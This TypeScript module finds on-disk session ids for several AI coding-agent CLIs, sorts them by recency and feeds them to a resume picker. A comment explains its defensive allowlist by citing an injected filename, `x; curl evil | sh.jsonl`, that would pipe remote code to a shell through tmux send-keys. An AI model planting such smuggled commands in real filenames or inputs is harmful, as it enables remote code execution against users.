/**
 * Per-provider on-disk native session-id discovery (profile-env aware).
 *
 * Used as the fallback when no native id was captured into the DB (Codex /
 * Gemini / OpenCode / Cursor / Kimi have no push-capture hook), and to power the
 * multi-provider resume picker. Pure fs reads — no DB, no tmux.
 *
 * Claude reuses the proven streaming parser in `claude-session-service.ts`
 * (keyed by `encodePath(cwd)`); Codex/Gemini/OpenCode use a generic "newest
 * file by mtime under the provider's home dir" heuristic. Cursor scans the
 * metadata-only CLI chat index and filters it by the requested cwd. Kimi reads
 * its top-level session_index.jsonl and keeps records whose workDir matches
 * the requested project path. Per-provider behavior is driven by the registry
 * plus these storage-layout adapters.
 */

import { runtimeJoin as join } from "@/lib/dynamic-fs";
import { homedir } from "node:os";
import { readFile, readdir, stat } from "node:fs/promises";
import type { AgentProviderType } from "@/types/session";
import type { ResumableSessionSummary } from "@/types/agent-resume";
import { getResumeSpec } from "./agent-resume-registry";
import { listSessions } from "@/services/claude-session-service";
import { createLogger } from "@/lib/logger";

const log = createLogger("SessionIdDiscovery");

/** One discovered native session id with its last-modified time (omitted when
 * no usable timestamp exists anywhere — never a Date(0) epoch). */
export interface DiscoveredSessionId {
  sessionId: string;
  lastModified?: string; // ISO
}

/** Resolve the provider's session-storage dir from the (profile-isolated) env. */
function resolveHomeDir(
  provider: AgentProviderType,
  env: Record<string, string>,
): string | null {
  const spec = getResumeSpec(provider);
  if (!spec.supportsResume) return null;
  const { homeEnvVar, defaultHomeSubpath } = spec.sessionIdSource;
  if (homeEnvVar && env[homeEnvVar]) return env[homeEnvVar];
  if (!defaultHomeSubpath) return null;
  return join(env.HOME ?? homedir(), defaultHomeSubpath);
}

/** Strip a single known extension from a filename to recover the bare native id. */
function stripExtension(name: string, exts: string[]): string {
  for (const ext of exts) {
    const suffix = `.${ext}`;
    if (name.toLowerCase().endsWith(suffix.toLowerCase())) {
      return name.slice(0, name.length - suffix.length);
    }
  }
  return name;
}

/**
 * [hgwo] Defense-in-depth: a discovered id (a readdir filename stem for
 * codex/gemini/opencode/cursor) is later typed into the shell prompt via
 * `tmux send-keys -l <cmd>` + `C-m`, so a session file named e.g.
 * `x; curl evil | sh.jsonl` would inject a command. The discovery stores are
 * user-writable (profile-scoped for some providers, shared for Cursor), so we
 * reject any id with shell-significant characters — only `[A-Za-z0-9._-]` is allowed. Claude's
 * UUIDs and the providers' opaque ids pass; a non-matching id is skipped so the
 * caller relaunches FRESH instead of resuming with an unsafe id.
 */
const SAFE_SESSION_ID = /^[A-Za-z0-9._-]+$/;

function isSafeSessionId(id: string): boolean {
  return id.length > 0 && SAFE_SESSION_ID.test(id);
}

/** Map without opening every file in a large chat index at once. */
async function mapWithConcurrency<T, R>(
  items: T[],
  limit: number,
  mapper: (item: T) => Promise<R>,
): Promise<R[]> {
  const results = new Array<R>(items.length);
  let nextIndex = 0;
  const worker = async () => {
    while (nextIndex < items.length) {
      const index = nextIndex++;
      results[index] = await mapper(items[index]);
    }
  };
  await Promise.all(
    Array.from({ length: Math.min(limit, items.length) }, () => worker()),
  );
  return results;
}

/** Resolve Cursor's data root. CLI config overrides do not relocate chat data. */
function resolveCursorDataDir(env: Record<string, string>): string {
  if (env.CURSOR_DATA_DIR) return env.CURSOR_DATA_DIR;
  return join(env.HOME ?? homedir(), ".cursor");
}

/** Resolve Kimi Code's data root: KIMI_CODE_HOME, else ~/.kimi-code. */
export function resolveKimiCodeHome(env: Record<string, string>): string {
  if (env.KIMI_CODE_HOME) return env.KIMI_CODE_HOME;
  return join(env.HOME ?? homedir(), ".kimi-code");
}

/**
 * Kimi Code indexes sessions in a top-level <home>/session_index.jsonl — one
 * JSON record per line with { sessionId, sessionDir, workDir }. Project-scoped
 * discovery keeps records whose workDir equals the requested project path and
 * whose sessionId passes the shell-safety guard (the id is later typed into a
 * tmux send-keys prompt — see isSafeSessionId). Malformed lines are skipped so
 * a partial write or schema drift degrades to "fewer sessions", never an error.
 *
 * Ordering is a single transitive comparator, newest first: primary key is the
 * sessionDir mtime (a missing/unusable mtime sorts as -Infinity, i.e. oldest),
 * ties broken by later position in the append-only index file. The index is
 * append-only and re-appends a sessionId on update, so duplicates are collapsed
 * to the newest occurrence (the resume picker keys rows by sessionId). Rows
 * with no usable timestamp anywhere fall back to the index file's mtime, and
 * omit lastModified entirely when even that is unavailable — never Date(0).
 */
export async function listKimiSessionIds(
  projectPath: string,
  env: Record<string, string>,
  limit: number,
): Promise<DiscoveredSessionId[]> {
  const indexPath = join(resolveKimiCodeHome(env), "session_index.jsonl");
  try {
    const raw = await readFile(indexPath, "utf8");
    let indexMtime: number | null = null;
    try {
      const mtimeMs = (await stat(indexPath)).mtimeMs;
      indexMtime = isValidDateMs(mtimeMs) ? mtimeMs : null;
    } catch {
      // Keep null — a row with no sessionDir mtime then omits lastModified
      // entirely instead of rendering the epoch (1970-01-01) in the picker.
    }

    const records: { sessionId: string; sessionDir?: string; index: number }[] = [];
    raw.split("\n").forEach((line, index) => {
      const trimmed = line.trim();
      if (!trimmed) return;
      try {
        const parsed: unknown = JSON.parse(trimmed);
        if (!parsed || typeof parsed !== "object") return;
        const record = parsed as Record<string, unknown>;
        if (record.workDir !== projectPath) return;
        if (typeof record.sessionId !== "string") return;
        if (!isSafeSessionId(record.sessionId)) return;
        records.push({
          sessionId: record.sessionId,
          sessionDir:
            typeof record.sessionDir === "string" ? record.sessionDir : undefined,
          index,
        });
      } catch {
        // Skip malformed lines.
      }
    });

    const withMtime = await mapWithConcurrency(records, 16, async (record) => {
      if (!record.sessionDir) return { ...record, mtime: null as number | null };
      try {
        const mtimeMs = (await stat(record.sessionDir)).mtimeMs;
        return { ...record, mtime: isValidDateMs(mtimeMs) ? mtimeMs : null };
      } catch {
        return { ...record, mtime: null as number | null };
      }
    });

    // Single transitive ordering, newest first: mtime desc with a missing
    // mtime treated as -Infinity (oldest); ties (and two missing mtimes, whose
    // subtraction is NaN) broken by later append-only index position first.
    type IndexedRecord = (typeof withMtime)[number];
    const byNewestFirst = (a: IndexedRecord, b: IndexedRecord): number => {
      const aKey = a.mtime ?? Number.NEGATIVE_INFINITY;
      const bKey = b.mtime ?? Number.NEGATIVE_INFINITY;
      const byMtime = bKey - aKey;
      if (byMtime !== 0 && !Number.isNaN(byMtime)) return byMtime;
      return b.index - a.index;
    };

    // The append-only index re-appends a sessionId on update, so the same id
    // can appear several times; collapse to the newest occurrence. The picker
    // keys React rows by sessionId, so duplicates must never reach the UI.
    const newestBySessionId = new Map<string, IndexedRecord>();
    for (const record of withMtime) {
      const existing = newestBySessionId.get(record.sessionId);
      if (!existing || byNewestFirst(record, existing) < 0) {
        newestBySessionId.set(record.sessionId, record);
      }
    }

    return [...newestBySessionId.values()]
      .sort(byNewestFirst)
      .slice(0, limit)
      .map(({ sessionId, mtime }): DiscoveredSessionId => {
        const lastModifiedMs = mtime ?? indexMtime;
        if (lastModifiedMs === null) {
          // No usable timestamp anywhere (sessionDir and index both
          // unstat-able): omit lastModified rather than emitting Date(0).
          return { sessionId };
        }
        return { sessionId, lastModified: new Date(lastModifiedMs).toISOString() };
      });
  } catch {
    return [];
  }
}

/** Whether a millisecond timestamp can be losslessly rendered as ISO. */
function isValidDateMs(value: unknown): value is number {
  return (
    typeof value === "number" &&
    Number.isFinite(value) &&
    !Number.isNaN(new Date(value).getTime())
  );
}

/**
 * Cursor's CLI chat index stores metadata at:
 *   <data>/chats/<workspace-hash>/<chat-id>/meta.json
 *
 * Workspace hashes are opaque, so discovery scans every bucket and uses the
 * metadata's exact `cwd` to select this project. `hasConversation` excludes
 * shell/IDE records that cannot be resumed as CLI conversations. We never load
 * the adjacent `store.db` conversation bodies.
 */
async function listCursorSessionIds(
  cwd: string,
  env: Record<string, string>,
  limit: number,
): Promise<DiscoveredSessionId[]> {
  const chatsDir = join(resolveCursorDataDir(env), "chats");

  try {
    // Workspace bucket names are opaque index keys and are never typed into a
    // shell, so the chat-id injection guard must not filter them.
    const workspaceBuckets = await readdir(chatsDir);
    const perWorkspace = await mapWithConcurrency(
      workspaceBuckets,
      16,
      async (workspaceBucket) => {
        const workspaceDir = join(chatsDir, workspaceBucket);
        try {
          const chatIds = (await readdir(workspaceDir)).filter(isSafeSessionId);
          return chatIds.map((sessionId) => ({ workspaceDir, sessionId }));
        } catch {
          return [];
        }
      },
    );
    const candidates = perWorkspace.flat();
    const metadataEntries = await mapWithConcurrency(
      candidates,
      32,
      async ({ workspaceDir, sessionId }) => {
        const metadataPath = join(workspaceDir, sessionId, "meta.json");
        try {
          const parsed: unknown = JSON.parse(await readFile(metadataPath, "utf8"));
          if (!parsed || typeof parsed !== "object") {
            return { recognized: false, entry: null };
          }

          const metadata = parsed as Record<string, unknown>;
          if (
            typeof metadata.cwd !== "string" ||
            typeof metadata.hasConversation !== "boolean"
          ) {
            return { recognized: false, entry: null };
          }
          if (metadata.cwd !== cwd || metadata.hasConversation !== true) {
            return { recognized: true, entry: null };
          }

          const updatedAtMs =
            isValidDateMs(metadata.updatedAtMs)
              ? metadata.updatedAtMs
              : isValidDateMs(metadata.createdAtMs)
                ? metadata.createdAtMs
                : (await stat(metadataPath)).mtimeMs;

          if (!isValidDateMs(updatedAtMs)) {
            return { recognized: true, entry: null };
          }

          return {
            recognized: true,
            entry: { sessionId, mtime: updatedAtMs },
          };
        } catch {
          return { recognized: false, entry: null };
        }
      },
    );

    if (
      candidates.length > 0 &&
      metadataEntries.every((result) => !result.recognized)
    ) {
      log.warn("Cursor chat metadata was unreadable or had an unknown schema", {
        candidateCount: candidates.length,
      });
    }

    return metadataEntries
      .map((result) => result.entry)
      .filter((entry): entry is { sessionId: string; mtime: number } => entry !== null)
      .sort((a, b) => b.mtime - a.mtime)
      .map(({ sessionId, mtime }) => ({
        sessionId,
        lastModified: new Date(mtime).toISOString(),
      }))
      .slice(0, limit);
  } catch {
    return [];
  }
}

/**
 * Generic disk discovery: newest-first session ids from the files under a
 * provider's (profile-isolated) home dir. Shared by both the lean
 * `listSessionIds` and the richer `listResumableSessions`. Returns [] if the
 * provider has no on-disk store or the dir can't be read.
 */
async function listDiskSessionIds(
  provider: AgentProviderType,
  env: Record<string, string>,
  limit: number,
): Promise<DiscoveredSessionId[]> {
  const dir = resolveHomeDir(provider, env);
  if (!dir) return [];
  const spec = getResumeSpec(provider);

  try {
    const entries = await readdir(dir);
    const withMtime = await Promise.all(
      entries.map(async (name) => {
        try {
          return { name, mtime: (await stat(join(dir, name))).mtimeMs };
        } catch {
          return { name, mtime: 0 };
        }
      }),
    );
    withMtime.sort((a, b) => b.mtime - a.mtime);
    return withMtime
      .map(({ name, mtime }) => ({
        sessionId: stripExtension(name, spec.sessionIdSource.fileExtensions),
        lastModified: new Date(mtime).toISOString(),
      }))
      // Drop ids with shell-significant characters before they can reach a tmux
      // send-keys prompt line (defense-in-depth — see isSafeSessionId).
      .filter((entry) => isSafeSessionId(entry.sessionId))
      .slice(0, limit);
  } catch {
    return [];
  }
}

/**
 * List native session ids for a provider+cwd, newest first.
 *
 * For Claude this delegates to the streaming parser (cwd-aware). For the
 * generic providers it lists files under the provider's home dir sorted by
 * mtime. Returns at most `limit` entries (default 20).
 */
export async function listSessionIds(
  provider: AgentProviderType,
  cwd: string,
  env: Record<string, string>,
  limit = 20,
): Promise<DiscoveredSessionId[]> {
  if (provider === "claude") {
    // listSessions joins ".claude" itself, so pass the bare config dir.
    const configDir = env.CLAUDE_CONFIG_DIR;
    const sessions = await listSessions(cwd, { limit, profileConfigDir: configDir });
    // Claude ids are UUIDs (safe); filter anyway for a single uniform guard.
    return sessions
      .map((s) => ({ sessionId: s.sessionId, lastModified: s.lastModified }))
      .filter((entry) => isSafeSessionId(entry.sessionId));
  }

  if (provider === "cursor") {
    return listCursorSessionIds(cwd, env, limit);
  }

  if (provider === "kimi") {
    return listKimiSessionIds(cwd, env, limit);
  }

  return listDiskSessionIds(provider, env, limit);
}

/**
 * List resumable sessions for the multi-provider resume PICKER, newest first.
 *
 * Like `listSessionIds` but returns the richer provider-agnostic
 * `ResumableSessionSummary`. For Claude it preserves the `.jsonl`-derived
 * previews (`firstUserMessage`, `gitBranch`) so the picker looks exactly as it
 * did against the old Claude-only route. The disk-discovery providers
 * (codex/gemini/opencode/cursor/kimi) have no cheap preview, so those fields are
 * omitted and the UI degrades to id + timestamp. A provider with no on-disk
 * store (or whose dir is empty/unreadable) yields an empty list — the picker
 * shows an empty state rather than erroring.
 */
export async function listResumableSessions(
  provider: AgentProviderType,
  cwd: string,
  env: Record<string, string>,
  limit = 20,
): Promise<ResumableSessionSummary[]> {
  if (provider === "claude") {
    const configDir = env.CLAUDE_CONFIG_DIR;
    const sessions = await listSessions(cwd, { limit, profileConfigDir: configDir });
    return sessions
      .filter((s) => isSafeSessionId(s.sessionId))
      .map((s) => ({
        sessionId: s.sessionId,
        lastModified: s.lastModified,
        firstUserMessage: s.firstUserMessage,
        gitBranch: s.gitBranch,
      }));
  }

  if (provider === "cursor") {
    return listCursorSessionIds(cwd, env, limit);
  }

  if (provider === "kimi") {
    return listKimiSessionIds(cwd, env, limit);
  }

  // Generic providers: id + timestamp only (no cheap on-disk preview).
  return listDiskSessionIds(provider, env, limit);
}

/** Newest native session id for the given provider+cwd, or null. */
export async function discoverLatestSessionId(
  provider: AgentProviderType,
  cwd: string,
  env: Record<string, string>,
): Promise<string | null> {
  const spec = getResumeSpec(provider);
  if (!spec.supportsResume) return null;
  const [latest] = await listSessionIds(provider, cwd, env, 1);
  return latest?.sessionId ?? null;
}
